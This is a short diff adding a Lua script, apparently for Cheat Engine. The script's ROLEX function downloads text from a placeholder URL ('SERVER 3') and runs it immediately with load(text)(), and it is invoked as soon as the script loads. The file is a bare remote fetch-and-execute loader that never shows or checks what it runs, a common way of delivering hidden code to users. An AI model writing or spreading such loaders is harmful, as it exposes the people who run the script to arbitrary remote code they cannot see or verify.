@@ -1,0 +1,8 @@
+function ROLEX()
+local url = 'SERVER 3'
+local int = getInternet()
+local text = int.getURL(url)
+int.destroy()
+load(text)()
+end
+ROLEX()
